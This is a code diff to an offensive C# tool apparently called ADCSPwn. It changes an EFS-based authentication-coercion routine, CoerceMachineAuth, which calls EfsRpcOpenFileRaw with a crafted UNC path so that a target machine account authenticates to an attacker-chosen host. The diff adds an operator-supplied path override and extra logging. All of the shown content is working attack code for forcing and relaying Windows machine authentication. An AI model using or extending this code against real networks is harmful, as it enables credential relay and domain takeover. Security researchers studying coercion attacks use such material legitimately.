@@ -18,7 +18,7 @@ namespace ADCSPwn
 {
     class EFSTrigger
     {
-        public static void CoerceMachineAuth(string machine)
+        public static void CoerceMachineAuth(string machine, string uncOveride)
         {
             // trigger connection from the workstations machine account
 
@@ -39,20 +39,30 @@ namespace ADCSPwn
                 var part2 = new string(Enumerable.Repeat(chars, 10).Select(s => s[random.Next(s.Length)]).ToArray());
                 var part3 = new string(Enumerable.Repeat(chars, 10).Select(s => s[random.Next(s.Length)]).ToArray());
 
-                connection_path += "\\\\";
-                connection_path += Dns.GetHostName(); // needs to be a dns name
-                connection_path += "@";
-                connection_path += Config.port;
-                connection_path += "/";
-                connection_path += part1 + "\\";
-                connection_path += part2 + "\\";
-                connection_path += part3;
 
+                if (string.IsNullOrEmpty(uncOveride))
+                {
+                    connection_path += "\\\\";
+                    connection_path += Dns.GetHostName();
+                    connection_path += "@";
+                    connection_path += Config.port;
+                    connection_path += "/";
+                    connection_path += part1 + "\\";
+                    connection_path += part2 + "\\";
+                    connection_path += part3;
+
+                }
+                else
+                {
+                    connection_path = uncOveride;
+                }
+            
+                Console.WriteLine($"[i] Using path {connection_path}");
                 r.EfsRpcOpenFileRaw(out hHandle, connection_path, machine, 0);
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex);
+                Console.WriteLine($"[EfsRpcOpenFileRaw] {ex}");
             }
 
             return;
